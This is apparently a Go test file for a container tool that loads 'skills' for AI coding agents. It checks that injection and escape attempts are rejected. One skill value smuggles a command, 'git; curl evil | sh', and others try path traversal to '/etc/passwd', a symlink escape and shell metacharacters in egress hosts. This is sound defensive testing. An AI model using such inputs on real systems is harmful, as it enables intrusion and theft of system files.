package skills

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"byre/internal/config"
)

// writeSkill creates skillsDir/<name>/skill.toml (+ optional extra files).
func writeSkill(t *testing.T, skillsDir, name, toml string, files map[string]string) {
	t.Helper()
	dir := filepath.Join(skillsDir, name)
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "skill.toml"), []byte(toml), 0o644); err != nil {
		t.Fatal(err)
	}
	for fn, content := range files {
		path := filepath.Join(dir, fn)
		if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
			t.Fatal(err)
		}
	}
}

const sampleSkill = `
[build]
apt = ["ripgrep"]
dockerfile = ["RUN echo sample"]

[runtime]
env = { SAMPLE = "1" }
caps = ["SYS_PTRACE"]

[context]
text = "sample context"
`

const fakeAgentSkill = `
[build]
npm_global = ["@fake/agent-cli"]

[agent]
command = "fake-agent --yolo"
state = ".fake"

[context]
text = "agent context"

[[volumes]]
name = ".fake"
role = "state"
target = "/home/dev/.fake"
`

func TestResolveSampleAndAgentSkills(t *testing.T) {
	dir := t.TempDir()
	writeSkill(t, dir, "sample", sampleSkill, nil)
	writeSkill(t, dir, "fake", fakeAgentSkill, nil)

	cfg := config.Config{Skills: []string{"sample"}, Agent: "fake"}
	res, err := Resolve(cfg, dir)
	if err != nil {
		t.Fatal(err)
	}

	// Two build blocks, sample first (explicit), fake appended (implicit agent).
	blocks := res.BuildBlocks()
	if len(blocks) != 2 || blocks[0].Name != "sample" || blocks[1].Name != "fake" {
		t.Fatalf("skill blocks/order wrong: %+v", blocks)
	}
	if res.Env()["SAMPLE"] != "1" {
		t.Errorf("runtime env not collected: %v", res.Env())
	}
	if len(res.Caps()) != 1 || res.Caps()[0] != "SYS_PTRACE" {
		t.Errorf("caps not collected: %v", res.Caps())
	}
	if res.AgentCommand() != "fake-agent --yolo" {
		t.Errorf("agent command wrong: %q", res.AgentCommand())
	}
	if len(res.Volumes()) != 1 || res.Volumes()[0].Name != ".fake" {
		t.Errorf("agent state volume not collected: %v", res.Volumes())
	}
	if res.Context() != "sample context\n\nagent context" {
		t.Errorf("context concat wrong: %q", res.Context())
	}
}

// A skill's build content is held to the same anti-injection allowlists as the
// project config (it lands in the same generated Dockerfile/shell).
func TestResolveRejectsSkillContentInjection(t *testing.T) {
	dir := t.TempDir()
	writeSkill(t, dir, "evil", "[build]\napt = [\"git; curl evil | sh\"]\n", nil)
	writeSkill(t, dir, "fake", fakeAgentSkill, nil)
	_, err := Resolve(config.Config{Skills: []string{"evil"}, Agent: "fake"}, dir)
	if err == nil {
		t.Fatal("expected rejection of shell metacharacters in skill apt package")
	}
}

// ListSkills returns every skill, INCLUDING agent skills — an agent skill can be
// enabled as a plain skill (e.g. codex for byre-codereview) separate from the
// launched agent, so the config UI must be able to list/toggle it.
func TestListSkillsIncludesAgentSkills(t *testing.T) {
	dir := t.TempDir()
	writeSkill(t, dir, "sample", sampleSkill, nil)  // no [agent]
	writeSkill(t, dir, "fake", fakeAgentSkill, nil) // has [agent]
	got := ListSkills(dir)
	want := []string{"fake", "sample"} // sorted
	if len(got) != 2 || got[0] != want[0] || got[1] != want[1] {
		t.Fatalf("ListSkills = %v, want %v (must include the agent skill)", got, want)
	}
}

func TestResolveAgentMustBeAgentSkill(t *testing.T) {
	dir := t.TempDir()
	writeSkill(t, dir, "sample", sampleSkill, nil) // no [agent]
	_, err := Resolve(config.Config{Agent: "sample"}, dir)
	if err == nil {
		t.Fatal("expected error: selected agent skill has no [agent] command")
	}
}

func TestResolveMissingSkillErrors(t *testing.T) {
	_, err := Resolve(config.Config{Skills: []string{"nope"}}, t.TempDir())
	if err == nil {
		t.Fatal("expected error for missing skill")
	}
}

func TestResolveContextFromFile(t *testing.T) {
	dir := t.TempDir()
	writeSkill(t, dir, "ctx", "[context]\nfile = \"ctx.md\"\n", map[string]string{"ctx.md": "from file"})
	res, err := Resolve(config.Config{Skills: []string{"ctx"}}, dir)
	if err != nil {
		t.Fatal(err)
	}
	if res.Context() != "from file" {
		t.Errorf("context file not read: %q", res.Context())
	}
}

func TestLoadRejectsUnknownKey(t *testing.T) {
	dir := t.TempDir()
	writeSkill(t, dir, "typo", "[agent]\ncommmand = \"x\"\n", nil) // misspelled command
	if _, err := Load(dir, "typo"); err == nil {
		t.Fatal("expected unknown-key error for typo'd skill.toml")
	}
}

func TestResolveContextFileTraversalRejected(t *testing.T) {
	dir := t.TempDir()
	writeSkill(t, dir, "evil", "[context]\nfile = \"../../etc/passwd\"\n", nil)
	if _, err := Resolve(config.Config{Skills: []string{"evil"}}, dir); err == nil {
		t.Fatal("expected rejection of path-traversal context file")
	}
}

func TestResolveContextSymlinkEscapeRejected(t *testing.T) {
	dir := t.TempDir()
	outside := filepath.Join(t.TempDir(), "secret")
	if err := os.WriteFile(outside, []byte("secret"), 0o644); err != nil {
		t.Fatal(err)
	}
	writeSkill(t, dir, "evil", "[context]\nfile = \"link\"\n", nil)
	// symlink inside the skill dir pointing outside the bundle
	if err := os.Symlink(outside, filepath.Join(dir, "evil", "link")); err != nil {
		t.Fatal(err)
	}
	if _, err := Resolve(config.Config{Skills: []string{"evil"}}, dir); err == nil {
		t.Fatal("expected rejection of symlink escaping the skill dir")
	}
}

func TestResolveAgentStateMustBeContributed(t *testing.T) {
	dir := t.TempDir()
	// declares state ".claude" but contributes no such state volume
	writeSkill(t, dir, "claudish", "[agent]\ncommand = \"claude\"\nstate = \".claude\"\n", nil)
	if _, err := Resolve(config.Config{Agent: "claudish"}, dir); err == nil {
		t.Fatal("expected error: agent.state names no contributed state volume")
	}
}

// agentWithPrefs is an agent skill that declares a curated prefs block.
const agentWithPrefs = `
[agent]
command = "fake-agent"
state = ".fake"

[agent.prefs]
from = "~/.fake"
files = ["keybindings.json", "themes"]

[[volumes]]
name = ".fake"
role = "state"
target = "/home/dev/.fake"
`

func TestResolvePrefsCollected(t *testing.T) {
	dir := t.TempDir()
	writeSkill(t, dir, "fake", agentWithPrefs, nil)
	res, err := Resolve(config.Config{Agent: "fake"}, dir)
	if err != nil {
		t.Fatal(err)
	}
	if res.AgentPrefs() == nil {
		t.Fatal("expected AgentPrefs to be set")
	}
	if res.AgentPrefs().From != "~/.fake" || len(res.AgentPrefs().Files) != 2 {
		t.Fatalf("prefs not parsed: %+v", res.AgentPrefs())
	}
}

func TestResolvePrefsRequireState(t *testing.T) {
	dir := t.TempDir()
	// prefs but no [agent].state -> nowhere to seed -> error.
	writeSkill(t, dir, "fake", "[agent]\ncommand = \"x\"\n[agent.prefs]\nfrom = \"~/.fake\"\nfiles = [\"a\"]\n", nil)
	if _, err := Resolve(config.Config{Agent: "fake"}, dir); err == nil {
		t.Fatal("expected error: prefs require a state volume")
	}
}

func TestResolvePrefsRejectsEscapingFile(t *testing.T) {
	dir := t.TempDir()
	toml := "[agent]\ncommand = \"x\"\nstate = \".fake\"\n[agent.prefs]\nfrom = \"~/.fake\"\nfiles = [\"../../etc/passwd\"]\n" +
		"[[volumes]]\nname = \".fake\"\nrole = \"state\"\ntarget = \"/home/dev/.fake\"\n"
	writeSkill(t, dir, "fake", toml, nil)
	if _, err := Resolve(config.Config{Agent: "fake"}, dir); err == nil {
		t.Fatal("expected error: prefs file escapes from-dir")
	}
}

func TestResolvePrefsRejectsWholeDir(t *testing.T) {
	dir := t.TempDir()
	// files = ["."] would copy the entire from-dir (incl. secret-bearing files);
	// must be rejected so curation can't be bypassed.
	for _, bad := range []string{".", "./", "x/.."} {
		toml := "[agent]\ncommand = \"x\"\nstate = \".fake\"\n[agent.prefs]\nfrom = \"~/.fake\"\nfiles = [\"" + bad + "\"]\n" +
			"[[volumes]]\nname = \".fake\"\nrole = \"state\"\ntarget = \"/home/dev/.fake\"\n"
		writeSkill(t, dir, "fake", toml, nil)
		if _, err := Resolve(config.Config{Agent: "fake"}, dir); err == nil {
			t.Fatalf("expected rejection of prefs file %q (whole-dir copy)", bad)
		}
	}
}

func TestResolveNoAgent(t *testing.T) {
	dir := t.TempDir()
	writeSkill(t, dir, "sample", sampleSkill, nil)
	res, err := Resolve(config.Config{Skills: []string{"sample"}}, dir)
	if err != nil {
		t.Fatal(err)
	}
	if res.AgentCommand() != "" {
		t.Errorf("no agent should mean empty AgentCommand: %q", res.AgentCommand())
	}
}

func TestResolveSkillFiles(t *testing.T) {
	dir := t.TempDir()
	const toml = `
[build]
files = { "review.sh" = "/usr/local/bin/byre-review", "lib/helper.sh" = "/opt/helper.sh" }
`
	writeSkill(t, dir, "tools", toml, map[string]string{
		"review.sh":     "#!/bin/sh\necho review\n",
		"lib/helper.sh": "echo help\n",
	})
	res, err := Resolve(config.Config{Skills: []string{"tools"}}, dir)
	if err != nil {
		t.Fatal(err)
	}
	files := res.BuildBlocks()[0].Files
	if len(files) != 2 {
		t.Fatalf("want 2 skill files, got %d: %+v", len(files), files)
	}
	// Sorted by source for determinism: "lib/helper.sh" < "review.sh".
	if files[0].Rel != "lib/helper.sh" || files[0].Dest != "/opt/helper.sh" {
		t.Errorf("first file wrong: %+v", files[0])
	}
	if files[1].Rel != "review.sh" || files[1].Dest != "/usr/local/bin/byre-review" {
		t.Errorf("second file wrong: %+v", files[1])
	}
	if res.BuildBlocks()[0].Name != "tools" {
		t.Errorf("skill name not recorded: %+v", res.BuildBlocks()[0])
	}
}

func TestResolveSkillFilesRejectsRelativeDest(t *testing.T) {
	dir := t.TempDir()
	writeSkill(t, dir, "bad", "[build]\nfiles = { \"x.sh\" = \"relative/dest\" }\n",
		map[string]string{"x.sh": "x\n"})
	if _, err := Resolve(config.Config{Skills: []string{"bad"}}, dir); err == nil {
		t.Fatal("expected rejection of non-absolute file destination")
	}
}

func TestResolveSkillFilesRejectsEscape(t *testing.T) {
	dir := t.TempDir()
	writeSkill(t, dir, "bad", "[build]\nfiles = { \"../escape.sh\" = \"/x.sh\" }\n", nil)
	if _, err := Resolve(config.Config{Skills: []string{"bad"}}, dir); err == nil {
		t.Fatal("expected rejection of source escaping the skill dir")
	}
}

func TestResolveAgentContextTarget(t *testing.T) {
	dir := t.TempDir()
	const toml = `
[agent]
command = "fake --go"
state = ".fake"
context_target = "/home/dev/.fake/MEM.md"
[context]
text = "workflow rules"
[[volumes]]
name = ".fake"
role = "state"
target = "/home/dev/.fake"
`
	writeSkill(t, dir, "fake", toml, nil)
	res, err := Resolve(config.Config{Agent: "fake"}, dir)
	if err != nil {
		t.Fatal(err)
	}
	if res.AgentContextTarget() != "/home/dev/.fake/MEM.md" {
		t.Errorf("context target not resolved: %q", res.AgentContextTarget())
	}
	if res.Context() != "workflow rules" {
		t.Errorf("context not resolved: %q", res.Context())
	}
}

func TestResolveAgentContextTargetMustBeAbsolute(t *testing.T) {
	dir := t.TempDir()
	const toml = `
[agent]
command = "fake --go"
state = ".fake"
context_target = "rel/MEM.md"
[[volumes]]
name = ".fake"
role = "state"
target = "/home/dev/.fake"
`
	writeSkill(t, dir, "fake", toml, nil)
	if _, err := Resolve(config.Config{Agent: "fake"}, dir); err == nil {
		t.Fatal("expected rejection of non-absolute context_target")
	}
}

func TestResolveRejectsUnsafeSkillName(t *testing.T) {
	dir := t.TempDir()
	if _, err := Resolve(config.Config{Skills: []string{"../evil"}}, dir); err == nil {
		t.Fatal("expected rejection of skill name with path separator")
	}
}

func TestResolveContextTargetMustBeWithinHome(t *testing.T) {
	dir := t.TempDir()
	const toml = `
[agent]
command = "fake --go"
state = ".fake"
context_target = "/etc/passwd"
[[volumes]]
name = ".fake"
role = "state"
target = "/home/dev/.fake"
`
	writeSkill(t, dir, "fake", toml, nil)
	if _, err := Resolve(config.Config{Agent: "fake"}, dir); err == nil {
		t.Fatal("expected rejection of context_target outside /home/dev")
	}
}

func TestResolveContextTargetRejectsHomeItself(t *testing.T) {
	dir := t.TempDir()
	const toml = `
[agent]
command = "fake --go"
state = ".fake"
context_target = "/home/dev"
[[volumes]]
name = ".fake"
role = "state"
target = "/home/dev/.fake"
`
	writeSkill(t, dir, "fake", toml, nil)
	if _, err := Resolve(config.Config{Agent: "fake"}, dir); err == nil {
		t.Fatal("expected rejection of context_target == /home/dev (not a file)")
	}
}

func TestResolveRejectsCrossSkillEnvConflict(t *testing.T) {
	dir := t.TempDir()
	writeSkill(t, dir, "a", "[runtime]\nenv = { EDITOR = \"vim\" }\n", nil)
	writeSkill(t, dir, "b", "[runtime]\nenv = { EDITOR = \"emacs\" }\n", nil)
	_, err := Resolve(config.Config{Skills: []string{"a", "b"}}, dir)
	if err == nil {
		t.Fatal("expected an error for a cross-skill env conflict")
	}
	// The error must name both skills and the key, so the fix is obvious.
	for _, want := range []string{"a", "b", "EDITOR"} {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("conflict error should mention %q: %v", want, err)
		}
	}
}

func TestResolveAllowsIdenticalEnvAcrossSkills(t *testing.T) {
	dir := t.TempDir()
	writeSkill(t, dir, "a", "[runtime]\nenv = { EDITOR = \"vim\" }\n", nil)
	writeSkill(t, dir, "b", "[runtime]\nenv = { EDITOR = \"vim\" }\n", nil)
	res, err := Resolve(config.Config{Skills: []string{"a", "b"}}, dir)
	if err != nil {
		t.Fatalf("identical values are order-independent and must be allowed: %v", err)
	}
	if res.Env()["EDITOR"] != "vim" {
		t.Errorf("env not merged: %v", res.Env())
	}
}

func TestGrantsAttributeRunArgs(t *testing.T) {
	dir := t.TempDir()
	writeSkill(t, dir, "danger", "[runtime]\nrun_args = [\"--privileged\"]\n", nil)
	writeSkill(t, dir, "plain", "[build]\napt = [\"jq\"]\n", nil)
	res, err := Resolve(config.Config{Skills: []string{"danger", "plain"}}, dir)
	if err != nil {
		t.Fatal(err)
	}
	grants := res.Grants()
	if len(grants) != 1 || grants[0].Skill != "danger" {
		t.Fatalf("run_args alone must produce an attributed grant: %+v", grants)
	}
	if len(grants[0].RunArgs) != 1 || grants[0].RunArgs[0] != "--privileged" {
		t.Errorf("grant should carry the run args: %+v", grants[0])
	}
}

func TestResolveNetworkPostureAndNetnsInit(t *testing.T) {
	dir := t.TempDir()
	writeSkill(t, dir, "fw", "[runtime]\nnetwork_posture = \"deny-by-default\"\nnetns_init = \"/usr/local/bin/byre-firewall\"\n", nil)
	res, err := Resolve(config.Config{Skills: []string{"fw"}}, dir)
	if err != nil {
		t.Fatal(err)
	}
	posture, by := res.NetworkPosture()
	if posture != "deny-by-default" || by != "fw" {
		t.Errorf("posture = %q by %q, want deny-by-default by fw", posture, by)
	}
	hooks := res.NetnsInits()
	if len(hooks) != 1 || hooks[0].Skill != "fw" || hooks[0].Path != "/usr/local/bin/byre-firewall" {
		t.Errorf("netns hooks = %+v", hooks)
	}
	// A netns_init is a root-privileged hook — it must surface as a grant.
	grants := res.Grants()
	if len(grants) != 1 || grants[0].NetnsInit != "/usr/local/bin/byre-firewall" {
		t.Errorf("netns_init must be an attributed grant: %+v", grants)
	}
}

func TestResolveNoPostureMeansOpen(t *testing.T) {
	dir := t.TempDir()
	writeSkill(t, dir, "plain", "[build]\napt = [\"jq\"]\n", nil)
	res, err := Resolve(config.Config{Skills: []string{"plain"}}, dir)
	if err != nil {
		t.Fatal(err)
	}
	if posture, by := res.NetworkPosture(); posture != "" || by != "" {
		t.Errorf("no skill declares a posture; got %q by %q", posture, by)
	}
}

func TestResolveRejectsConflictingPostures(t *testing.T) {
	dir := t.TempDir()
	writeSkill(t, dir, "fw1", "[runtime]\nnetwork_posture = \"deny-by-default\"\n", nil)
	writeSkill(t, dir, "fw2", "[runtime]\nnetwork_posture = \"deny-by-default\"\n", nil)
	_, err := Resolve(config.Config{Skills: []string{"fw1", "fw2"}}, dir)
	if err == nil {
		t.Fatal("two skills declaring a posture must be rejected (even identical: each claims the stance)")
	}
	for _, want := range []string{"fw1", "fw2"} {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("error should name %q: %v", want, err)
		}
	}
}

func TestResolveRejectsMalformedPosture(t *testing.T) {
	dir := t.TempDir()
	// Status prints the posture verbatim; a spoofing label must be rejected.
	writeSkill(t, dir, "fw", "[runtime]\nnetwork_posture = \"open  (all good)\"\n", nil)
	if _, err := Resolve(config.Config{Skills: []string{"fw"}}, dir); err == nil {
		t.Fatal("posture with spaces/parens must be rejected")
	}
}

func TestResolveRejectsRelativeNetnsInit(t *testing.T) {
	dir := t.TempDir()
	writeSkill(t, dir, "fw", "[runtime]\nnetns_init = \"bin/fw\"\n", nil)
	if _, err := Resolve(config.Config{Skills: []string{"fw"}}, dir); err == nil {
		t.Fatal("relative netns_init must be rejected")
	}
}

func TestEgressUnionAndAttribution(t *testing.T) {
	dir := t.TempDir()
	writeSkill(t, dir, "claude", "[runtime]\negress = [\"api.anthropic.com\", \"claude.ai\"]\n", nil)
	writeSkill(t, dir, "fw", "[runtime]\nnetwork_posture = \"deny-by-default\"\negress = [\"github.com\", \"deb.debian.org:80\", \"api.anthropic.com\"]\n", nil)
	res, err := Resolve(config.Config{Skills: []string{"claude", "fw"}}, dir)
	if err != nil {
		t.Fatal(err)
	}
	// Union: normalized host:port, deduped (api.anthropic.com appears in both),
	// port defaulted to 443, explicit :80 preserved, first-seen order.
	got := res.Egress()
	want := []string{"api.anthropic.com:443", "claude.ai:443", "github.com:443", "deb.debian.org:80"}
	if strings.Join(got, ",") != strings.Join(want, ",") {
		t.Fatalf("Egress() = %v, want %v", got, want)
	}
	// Attribution keeps the per-skill duplicate (both declared anthropic) so
	// status can show who asked for what.
	allows := res.EgressAllows()
	var fromClaude, fromFw int
	for _, a := range allows {
		switch a.Skill {
		case "claude":
			fromClaude++
		case "fw":
			fromFw++
		}
	}
	if fromClaude != 2 || fromFw != 3 {
		t.Errorf("attribution counts: claude=%d fw=%d; allows=%+v", fromClaude, fromFw, allows)
	}
}

func TestEgressRejectsMalformed(t *testing.T) {
	for _, bad := range []string{"api.anthropic.com:99999", "has space.com", "host:notaport:443", "bad;host"} {
		dir := t.TempDir()
		writeSkill(t, dir, "fw", "[runtime]\negress = [\""+bad+"\"]\n", nil)
		if _, err := Resolve(config.Config{Skills: []string{"fw"}}, dir); err == nil {
			t.Errorf("egress %q must be rejected", bad)
		}
	}
}

func TestEgressPortDefaultsTo443(t *testing.T) {
	if h, p, err := parseEgress("api.anthropic.com"); err != nil || h != "api.anthropic.com" || p != 443 {
		t.Fatalf("parseEgress default = (%q,%d,%v), want (api.anthropic.com,443,nil)", h, p, err)
	}
	if h, p, err := parseEgress("deb.debian.org:80"); err != nil || h != "deb.debian.org" || p != 80 {
		t.Fatalf("parseEgress explicit = (%q,%d,%v)", h, p, err)
	}
}

func TestSplitEgressSkipsMalformed(t *testing.T) {
	got := SplitEgress("api.anthropic.com, bad host, deb.debian.org:80 host:99999 grafana:8443")
	// "bad host" splits into two bare tokens "bad"/"host" (both valid hosts,
	// default 443); "host:99999" is out of range and dropped.
	want := map[string]int{"api.anthropic.com": 443, "bad": 443, "host": 443, "deb.debian.org": 80, "grafana": 8443}
	if len(got) != len(want) {
		t.Fatalf("SplitEgress = %+v, want %d entries", got, len(want))
	}
	for _, a := range got {
		if want[a.Host] != a.Port {
			t.Errorf("entry %s:%d not expected (want port %d)", a.Host, a.Port, want[a.Host])
		}
	}
}
